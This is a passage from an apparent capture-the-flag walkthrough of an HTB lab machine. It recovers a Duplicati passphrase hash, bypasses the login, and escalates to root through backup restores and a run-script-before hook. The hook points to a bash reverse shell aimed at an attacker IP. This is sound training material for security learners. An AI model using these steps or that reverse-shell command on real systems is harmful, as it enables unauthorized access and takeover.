+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://localhost:8200</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://localhost:8200/login.html</span>
+
+get-nonce=1
+</code></pre></div></div>
+<p>The response includes that nonce:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, must-revalidate, max-age=0</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 28 Aug 2024 16:46:13 GMT</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">140</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Tiny WebServer</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=20, max=400</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">xsrf-token=kjZA5E7i%2FXdXpfRHhGX14bo5b0wChi%2F0E2%2Fv2%2FGCiMk%3D; expires=Wed, 28 Aug 2024 16:56:13 GMT;path=/; </span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">session-nonce=IAuWUthCFuB59dL%2FbvPNj2n3hQOW%2FwBc4bBtzFQ1tI4%3D; expires=Wed, 28 Aug 2024 16:56:13 GMT;path=/; </span>
+
+<span class="p">{</span><span class="w">
+  </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"OK"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Nonce"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IAuWUthCFuB59dL/bvPNj2n3hQOW/wBc4bBtzFQ1tI4="</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Salt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I="</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Immediately the browser makes another request, using the cookies set in the previous request and sending not the password but some encrypted or hashed value:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login.cgi</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8200</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/javascript, */*; q=0.01</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">57</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://localhost:8200</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://localhost:8200/login.html</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">xsrf-token=kjZA5E7i%2FXdXpfRHhGX14bo5b0wChi%2F0E2%2Fv2%2FGCiMk%3D; session-nonce=IAuWUthCFuB59dL%2FbvPNj2n3hQOW%2FwBc4bBtzFQ1tI4%3D</span>
+
+password=8MRQPI3uEGegK2BxWtuuiTGwdGpIaN%2FAURmrxikIlGw%3D
+</code></pre></div></div>
+<p>Without the password, there’s not much to do on the site.</p>
+<h4 id="filesystem-1">Filesystem</h4>
+<p>I noted <a href="#opt">above</a> the Duplicati folder in <code class="language-plaintext highlighter-rouge">/opt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:/opt$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backups  containerd  docker-compose.yml  duplicati
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">backups</code> has what look like Cacti backups:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:/opt$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> backups/cacti/
+<span class="go">total 19720
+-rw-r--r-- 1 root root   172507 May 26 16:29 duplicati-20240526T162923Z.dlist.zip
+-rw-r--r-- 1 root root   172088 Aug 20 11:30 duplicati-20240820T113028Z.dlist.zip
+-rw-r--r-- 1 root root   172085 Aug 28 14:14 duplicati-20240828T141430Z.dlist.zip
+-rw-r--r-- 1 root root    10868 Aug 28 14:14 duplicati-b40ba7a7ceb2e4d5e8fd493774d03ab84.dblock.zip
+-rw-r--r-- 1 root root 19423816 May 26 16:29 duplicati-bb19cdec32e5341b7a9b5d706407e60eb.dblock.zip
+-rw-r--r-- 1 root root    25004 Aug 20 11:30 duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip
+-rw-r--r-- 1 root root     1265 Aug 28 14:14 duplicati-i3395a793594c4180a06f3f31485275b6.dindex.zip
+-rw-r--r-- 1 root root     2493 Aug 20 11:30 duplicati-i7329b8d56a284479bade001406b5dec4.dindex.zip
+-rw-r--r-- 1 root root   185083 May 26 16:29 duplicati-ie7ca520ceb6b4ae081f78324e10b7b85.dindex.zip
+</span><span class="gp">www-data@monitorsthree:/opt$</span><span class="w"> </span><span class="nb">date</span>
+<span class="go">Wed Aug 28 15:10:28 UTC 2024
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file is for Duplicati:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s2">"</span><span class="s">3"</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">duplicati</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">lscr.io/linuxserver/duplicati:latest</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">duplicati</span>
+    <span class="na">environment</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">PUID=0</span>
+      <span class="pi">-</span> <span class="s">PGID=0</span>
+      <span class="pi">-</span> <span class="s">TZ=Etc/UTC</span>
+    <span class="na">volumes</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">/opt/duplicati/config:/config</span>
+      <span class="pi">-</span> <span class="s">/:/source</span>
+    <span class="na">ports</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">127.0.0.1:8200:8200</span>
+    <span class="na">restart</span><span class="pi">:</span> <span class="s">unless-stopped</span>
+</code></pre></div></div>
+<p>It shows port 8022, and that the <code class="language-plaintext highlighter-rouge">config</code> directory is loaded from the host. That directory has a few things:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@monitorsthree:/opt$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span> duplicati/config 
+<span class="go">.  ..  .config  CTADPNHLTC.sqlite  Duplicati-server.sqlite  control_dir_v2
+</span></code></pre></div></div>
+<p>The root of the host file system is also mapped into the container to <code class="language-plaintext highlighter-rouge">/source</code>.</p>
+<h4 id="db">DB</h4>
+<p>I’ll download a copy of the database and take a look:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlite3 Duplicati-server.sqlite 
+<span class="go">SQLite version 3.45.1 2024-01-30 16:01:20
+Enter ".help" for usage hints.
+</span><span class="gp">sqlite&gt; </span>.tables
+<span class="go">Backup        Log           Option        TempFile    
+ErrorLog      Metadata      Schedule      UIStorage   
+Filter        Notification  Source        Version  
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">Option</code> table has interesting stuff:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="450"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">Option</span><span class="p">;</span>
+<span class="go">4||encryption-module|
+4||compression-module|zip
+4||dblock-size|50mb
+4||--no-encryption|true
+-1||--asynchronous-upload-limit|50
+-1||--asynchronous-concurrent-upload-limit|50
+-2||startup-delay|0s
+-2||max-download-speed|
+-2||max-upload-speed|
+-2||thread-priority|
+-2||last-webserver-port|8200
+-2||is-first-run|
+-2||server-port-changed|True
+-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
+-2||server-passphrase-trayicon|9cdbbd46-da90-4fed-b040-30176b22394c
+-2||server-passphrase-trayicon-hash|9nWqm+3kCCGVB4QdCulf3gThzVkek3pzE10iwijGYGw=
+-2||last-update-check|638604513293063340
+-2||update-check-interval|
+-2||update-check-latest|
+-2||unacked-error|False
+-2||unacked-warning|False
+-2||server-listen-interface|any
+-2||server-ssl-certificate|
+-2||has-fixed-invalid-backup-id|True
+-2||update-channel|
+-2||usage-reporter-level|
+-2||has-asked-for-password-protection|true
+-2||disable-tray-icon-login|false
+-2||allowed-hostnames|*
+</span></code></pre></div></div>
+<p>I’ll need <code class="language-plaintext highlighter-rouge">server-passphrase</code>, and note that the <code class="language-plaintext highlighter-rouge">server-passphrase-salt</code> matches what was sent in the nonce request above.</p>
+<h3 id="duplicati-login">Duplicati Login</h3>
+<h4 id="background">Background</h4>
+<p><a href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">This Medium post</a> goes into detail about how to take the <code class="language-plaintext highlighter-rouge">server-passphrase</code> and use it to log in. Duplicati does client-side hashing on the input password before it sends that to the server. To prevent replays, it uses a nonce in a two-request process observed <a href="#site-2">above</a>.</p>
+<p>The input password is combined with the salt and hashed with SHA256:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">saltedpwd</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nc">SHA256</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Hex</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#login-password</span><span class="dl">'</span><span class="p">).</span><span class="nf">val</span><span class="p">())</span> <span class="o">+</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Base64</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">Salt</span><span class="p">)));</span>
+</code></pre></div></div>
+<p>Then the result is combined with the nonce to get what is sent back:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">noncedpwd</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nc">SHA256</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Hex</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Base64</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">Nonce</span><span class="p">)</span> <span class="o">+</span> <span class="nx">saltedpwd</span><span class="p">)).</span><span class="nf">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Base64</span><span class="p">);</span>
+</code></pre></div></div>
+<p>To test this, I’ll enter “password” and submit, but with Burp Proxy in intercept mode. I’ll let the first request come through, and it stops at the second. In the response from the first, I’ll grab the nonce and the salt, and then in the dev tools calculate the password:</p>
+<picture>
+<source srcset="/img/image-20240828140505216.webp" type="image/webp"/>
+<img alt="image-20240828140505216" class="include_image" loading="lazy" src="/img/image-20240828140505216.png"/>
+</picture>
+<p>That matches the intercepted second request:</p>
+<picture>
+<source srcset="/img/image-20240828140525633.webp" type="image/webp"/>
+<img alt="image-20240828140525633" class="include_image" loading="lazy" src="/img/image-20240828140525633.png"/>
+</picture>
+<p>What the post learns through trial and error is that the value in the database as the <code class="language-plaintext highlighter-rouge">server-passphrase</code> in the DB, when base64-decoded and then hex-encoded, is the value of <code class="language-plaintext highlighter-rouge">saltedpwd</code>.</p>
+<p>There are two attacks to try here:</p>
+<ul>
+<li>I could try to brute force the password working backwards from hash in the DB, but in this case it won’t crack.</li>
+<li>I could bypass the authentication by using the value from the DB to calculate the correct value to submit in the second request and get in.</li>
+</ul>
+<h4 id="auth-bypass">Auth Bypass</h4>
+<p>I’ll convert the value in the DB to hex:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho="</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd <span class="nt">-p</span>
+<span class="go">59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
+</span></code></pre></div></div>
+<p>That’s the standard salted SHA256 of the password. I’ll start the auth flow again with intercept on, stopping at the second request. I’ll grab the nonce value and go back into the dev tools console to calculate the <code class="language-plaintext highlighter-rouge">noncepwd</code>:</p>
+<picture>
+<source srcset="/img/image-20240828142142276.webp" type="image/webp"/>
+<img alt="image-20240828142142276" class="include_image" loading="lazy" src="/img/image-20240828142142276.png"/>
+</picture>
+<p>I’ll replace the <code class="language-plaintext highlighter-rouge">password</code> value in the intercepted request, forward it, and turn intercept off. Firefox shows a successful login:</p>
+<picture>
+<source srcset="/img/image-20240828142236975.webp" type="image/webp"/>
+<img alt="image-20240828142236975" class="include_image" loading="lazy" src="/img/image-20240828142236975.png"/>
+</picture>
+<h3 id="abusing-duplicati">Abusing Duplicati</h3>
+<p>There are many ways to get root access through Duplicati. I’ll show three:</p>
+<pre><code class="language-mermaid">flowchart TD;
+    subgraph identifier[" "]
+      direction LR
+      start1[ ] ---&gt;|intended| stop1[ ]
+      style start1 height:0px;
+      style stop1 height:0px;
+      start2[ ] ---&gt;|unintended| stop2[ ]
+      style start2 height:0px;
+      style stop2 height:0px;
+    end
+    A[&lt;a href="#duplicati-login"&gt;Duplicati Access&lt;/a&gt;]--&gt;B(&lt;a href='#root-backup'&gt;Backup /root&lt;/a&gt;);
+    B--&gt;C[root.txt];
+    A--&gt;D(&lt;a href='#root-ssh'&gt;Write root SSH\nkey on host&lt;/a&gt;);
+    D--&gt;E[Shell as root];
+    E--&gt;C;
+    A--&gt;F[&lt;a href='#root-in-duplicati-container'&gt;Shell in\nDuplicati Container&lt;/a&gt;];
+    F--&gt;E;
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+linkStyle 1,2,3,7,8 stroke-width:2px,stroke:#4B9CD3,fill:none;
+style identifier fill:#1d1d1d,color:#FFFFFFFF;
+</code></pre>
+<h3 id="root-backup">Root Backup</h3>
+<p>There’s a single backup running for Cacti, which is what was creating files in <code class="language-plaintext highlighter-rouge">/opt/backups/cacti</code>. I’ll create another one by clicking the nine dots at the top right and selecting “Add backup”:</p>
+<picture>
+<source srcset="/img/image-20240828160224589.webp" type="image/webp"/>
+<img alt="image-20240828160224589" class="include_image" loading="lazy" src="/img/image-20240828160224589.png"/>
+</picture>
+<p>I’ll select “Configure a new backup”:</p>
+<picture>
+<source srcset="/img/image-20240828160240863.webp" type="image/webp"/>
+<img alt="image-20240828160240863" class="include_image" loading="lazy" src="/img/image-20240828160240863.png"/>
+</picture>
+<p>I’ll give it a name, and set the encryption to none:</p>
+<picture>
+<source srcset="/img/image-20240828160307356.webp" type="image/webp"/>
+<img alt="image-20240828160307356" class="include_image" loading="lazy" src="/img/image-20240828160307356.png"/>
+</picture>
+<p>On the next page, I need to pick a backup destination:</p>
+<picture>
+<source srcset="/img/image-20240828160331868.webp" type="image/webp"/>
+<img alt="image-20240828160331868" class="include_image" loading="lazy" src="/img/image-20240828160331868.png"/>
+</picture>
+<p>This is my first interaction with the Duplicati filesystem. “Computer” is the Duplicati container. The <code class="language-plaintext highlighter-rouge">/source</code> directory is the host, as I noted from the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file <a href="#filesystem-1">above</a>. I’ll pick <code class="language-plaintext highlighter-rouge">/source/opt/backups/</code>, and click “Test connection”:</p>
+<picture>
+<source srcset="/img/image-20240828160637468.webp" type="image/webp"/>
+<img alt="image-20240828160637468" class="include_image" loading="lazy" src="/img/image-20240828160637468.png"/>
+</picture>
+<p>On clicking “Next”, the next screen wants to know the source of the data. I’ll select <code class="language-plaintext highlighter-rouge">/source/root</code>:</p>
+<picture>
+<source srcset="/img/image-20240828160724622.webp" type="image/webp"/>
+<img alt="image-20240828160724622" class="include_image" loading="lazy" src="/img/image-20240828160724622.png"/>
+</picture>
+<p>On the next screen, I’ll uncheck “Automatically run backups”:</p>
+<picture>
+<source srcset="/img/image-20240828160747399.webp" type="image/webp"/>
+<img alt="image-20240828160747399" class="include_image" loading="lazy" src="/img/image-20240828160747399.png"/>
+</picture>
+<p>The defaults are fine for the last screen:</p>
+<picture>
+<source srcset="/img/image-20240828160802848.webp" type="image/webp"/>
+<img alt="image-20240828160802848" class="include_image" loading="lazy" src="/img/image-20240828160802848.png"/>
+</picture>
+<p>On hitting Save (and maybe after a hard refresh), there’s another backup on the home screen:</p>
+<picture>
+<source srcset="/img/image-20240828160834494.webp" type="image/webp"/>
+<img alt="image-20240828160834494" class="include_image" loading="lazy" src="/img/image-20240828160834494.png"/>
+</picture>
+<p>I’ll click “Run now”, and it runs:</p>
+<picture>
+<source srcset="/img/image-20240828160849383.webp" type="image/webp"/>
+<img alt="image-20240828160849383" class="include_image" loading="lazy" src="/img/image-20240828160849383.png"/>
+</picture>
+<p>Expanding the options for the backup, I’ll click “Restore files…”:</p>
+<picture>
+<source srcset="/img/image-20240828160928989.webp" type="image/webp"/>
+<img alt="image-20240828160928989" class="include_image" loading="lazy" src="/img/image-20240828160928989.png"/>
+</picture>
+<p>I can see the files available in the backup:</p>
+<picture>
+<source srcset="/img/image-20240828160959359.webp" type="image/webp"/>
+<img alt="image-20240828160959359" class="include_image" loading="lazy" src="/img/image-20240828160959359.png"/>
+</picture>
+<p>There’s no SSH key, but I can get <code class="language-plaintext highlighter-rouge">root.txt</code>. I’ll check that and “Continue”. The next page asks where to restore the files. I’ll pick somewhere marcus can read:</p>
+<picture>
+<source srcset="/img/image-20240828161124911.webp" type="image/webp"/>
+<img alt="image-20240828161124911" class="include_image" loading="lazy" src="/img/image-20240828161124911.png"/>
+</picture>
+<p>On running this, <code class="language-plaintext highlighter-rouge">root.txt</code> is in <code class="language-plaintext highlighter-rouge">/tmp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:/tmp$</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">f039facf************************
+</span></code></pre></div></div>
+<h3 id="root-ssh">Root SSH</h3>
+<p>There’s no key in <code class="language-plaintext highlighter-rouge">/root/.ssh</code>, but perhaps I can write one. As a shortcut, I’ll just backup marcus’ <code class="language-plaintext highlighter-rouge">authorized_keys</code> file and restore it to <code class="language-plaintext highlighter-rouge">/root/.ssh/</code>.</p>
+<p>I can edit my existing backup, or start a new one (they are cleared out every 10 minutes, which is annoying). I’ll set the “Source data” to <code class="language-plaintext highlighter-rouge">/source/home/marcus</code>:</p>
+<picture>
+<source srcset="/img/image-20240828161927264.webp" type="image/webp"/>
+<img alt="image-20240828161927264" class="include_image" loading="lazy" src="/img/image-20240828161927264.png"/>
+</picture>
+<p>Once it’s saved, I’ll “Run now”, and then go back to “Restore files…”. I’ll select the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p>
+<picture>
+<source srcset="/img/image-20240828162240011.webp" type="image/webp"/>
+<img alt="image-20240828162240011" class="include_image" loading="lazy" src="/img/image-20240828162240011.png"/>
+</picture>
+<p>On the next screen, I’ll set the destination as <code class="language-plaintext highlighter-rouge">/source/root/.ssh</code>, and make sure that it is set to overwrite (I saw above that there is an existing file):</p>
+<picture>
+<source srcset="/img/image-20240828162440963.webp" type="image/webp"/>
+<img alt="image-20240828162440963" class="include_image" loading="lazy" src="/img/image-20240828162440963.png"/>
+</picture>
+<p>Now I can SSH in as root using the key I got for marcus:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/monitorsthree-marcus root@monitorsthree.htb
+<span class="go">Last login: Wed Aug 28 20:24:38 2024 from 10.10.14.6
+root@monitorsthree:~#
+</span></code></pre></div></div>
+<p>This method is closest to the author’s intended method, which was to backup a <code class="language-plaintext highlighter-rouge">cron</code> file and then restore it to <code class="language-plaintext highlighter-rouge">/source/etc/cron.d</code> to get executed and give a reverse shell.</p>
+<h3 id="root-in-duplicati-container">Root in Duplicati Container</h3>
+<p>Playing around with the settings, I am able to get execution in the Duplicati container, which then grants access to the filesystem of the host via the <code class="language-plaintext highlighter-rouge">/source</code> directory.</p>
+<p>I’ll create a simple reverse shell script in <code class="language-plaintext highlighter-rouge">/dev/shm</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>I’ll make sure to set it executable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">marcus@monitorsthree:/dev/shm$</span><span class="w"> </span>vim 0xdf.sh
+<span class="gp">marcus@monitorsthree:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x 0xdf.sh 
+</code></pre></div></div>
+<p>I’ll create a new backup, and it doesn’t really matter what I put for destination and source, as long as they are valid. When I get to the last screen, before accepting the defaults, I’ll look at the “Advanced options”:</p>
+<picture>
+<source srcset="/img/image-20240828162939252.webp" type="image/webp"/>
+<img alt="image-20240828162939252" class="include_image" loading="lazy" src="/img/image-20240828162939252.png"/>
+</picture>
+<p>There’s a bunch that run scripts:</p>
+<picture>
+<source srcset="/img/image-20240828163002356.webp" type="image/webp"/>
+<img alt="image-20240828163002356" class="include_image" loading="lazy" src="/img/image-20240828163002356.png"/>
+</picture>
+<p>I’ll pick <code class="language-plaintext highlighter-rouge">run-script-before</code>, and set it to my reverse shell:</p>
+<picture>
+<source srcset="/img/image-20240828163036735.webp" type="image/webp"/>
+<img alt="image-20240828163036735" class="include_image" loading="lazy" src="/img/image-20240828163036735.png"/>
+</picture>
+<p>When I Save and then click “Run now”, I get a shell as root in the container at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 444
+<span class="go">Listening on 0.0.0.0 444
+Connection received on 10.10.11.30 55406
+bash: cannot set terminal process group (146): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@c6f014fbbd51:/app/duplicati#</span><span class="w">
+</span></code></pre></div></div>
+<p>Because of the <code class="language-plaintext highlighter-rouge">/source</code> directory, I have full host access:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@c6f014fbbd51:/source/root#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">f039facf************************
+</span></code></pre></div></div>
+<p>And that’s easy to turn into a full root shell if I want (mess with <code class="language-plaintext highlighter-rouge">authorized_keys</code>, <code class="language-plaintext highlighter-rouge">sudoers</code>, <code class="language-plaintext highlighter-rouge">cron</code> files, <code class="language-plaintext highlighter-rouge">passwd</code>, etc).</p>
+<h2 id="beyond-root---8084">Beyond Root - 8084</h2>
+<h3 id="identify-xsp-webserver">Identify xsp Webserver</h3>
+<p>I am very curious to know what is happening on port 8084. As I mentioned <a href="#network">above</a>, it doesn’t seem to respond to <code class="language-plaintext highlighter-rouge">curl</code> or <code class="language-plaintext highlighter-rouge">nc</code> connections.</p>
+<p><code class="language-plaintext highlighter-rouge">netstat</code> shows the process listening is <code class="language-plaintext highlighter-rouge">mono</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>netstat <span class="nt">-tnlp</span> | <span class="nb">grep </span>8084
+<span class="go">tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1252/mono
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">mono</code> is a binary for running .NET executables on Linux. That process is running the <code class="language-plaintext highlighter-rouge">xsp4.exe</code> binary:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>1252
+<span class="go">www-data    1252  0.0  1.0 283924 41600 ?        Sl   Jan13   0:00 /usr/bin/mono /usr/lib/mono/4.5/xsp4.exe --port 8084 --address 0.0.0.0 --appconfigdir /etc/xsp4 --nonstop
+</span></code></pre></div></div>
+<p>xsp is <a href="https://github.com/mono/xsp">Mono’s ASP.NET web server</a>. The configuration is in <code class="language-plaintext highlighter-rouge">/etc/xsp4</code>, and there are two potential configs, both of which point to <code class="language-plaintext highlighter-rouge">/usr/share/monodoc/web</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:/etc/xsp4#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">conf.d  debian.webapp
+</span><span class="gp">root@monitorsthree:/etc/xsp4#</span><span class="w"> </span><span class="nb">cat </span>conf.d/monodoc-http/10_monodoc-http 
+<span class="gp">#</span><span class="w"> </span>This is the configuration file
+<span class="gp">#</span><span class="w"> </span><span class="k">for </span>the monodoc-http
+<span class="go">path = /usr/share/monodoc/web
+alias = /monodoc
+</span><span class="gp">root@monitorsthree:/etc/xsp4#</span><span class="w"> </span><span class="nb">cat </span>debian.webapp 
+<span class="go">&lt;apps&gt;
+  &lt;web-application&gt;
+    &lt;name&gt;monodoc&lt;/name&gt;
+    &lt;vpath&gt;/monodoc&lt;/vpath&gt;
+    &lt;path&gt;/usr/share/monodoc/web&lt;/path&gt;
+  &lt;/web-application&gt;
+&lt;/apps&gt;
+</span></code></pre></div></div>
+<p>This directory has a website in it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:/usr/share/monodoc/web#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">api.master  App_Code  Global.asax  index.aspx  monodoc.ashx  monodoc.css  plugins  plugins.def  README.md  robots.txt  skins  views  web.config
+</span></code></pre></div></div>
+<h3 id="iptables">IPTables</h3>
+<p>The reason nothing replies is how <code class="language-plaintext highlighter-rouge">iptables</code> is configured:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>iptables <span class="nt">-L</span>
+<span class="go">Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
+ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084
+DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
+ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084
+
+Chain FORWARD (policy DROP)
+target     prot opt source               destination
+DOCKER-USER  all  --  anywhere             anywhere
+DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
+ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+DOCKER     all  --  anywhere             anywhere
+ACCEPT     all  --  anywhere             anywhere
+ACCEPT     all  --  anywhere             anywhere
+ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+DOCKER     all  --  anywhere             anywhere
+ACCEPT     all  --  anywhere             anywhere
+ACCEPT     all  --  anywhere             anywhere
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain DOCKER (2 references)
+target     prot opt source               destination
+ACCEPT     tcp  --  anywhere             172.18.0.2           tcp dpt:8200
+
+Chain DOCKER-ISOLATION-STAGE-1 (1 references)
+target     prot opt source               destination
+DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
+DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
+RETURN     all  --  anywhere             anywhere
+
+Chain DOCKER-ISOLATION-STAGE-2 (2 references)
+target     prot opt source               destination
+DROP       all  --  anywhere             anywhere
+DROP       all  --  anywhere             anywhere
+RETURN     all  --  anywhere             anywhere
+
+Chain DOCKER-USER (1 references)
+target     prot opt source               destination
+RETURN     all  --  anywhere             anywhere
+</span><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>iptables <span class="nt">-L</span> <span class="nt">--line-numbers</span>
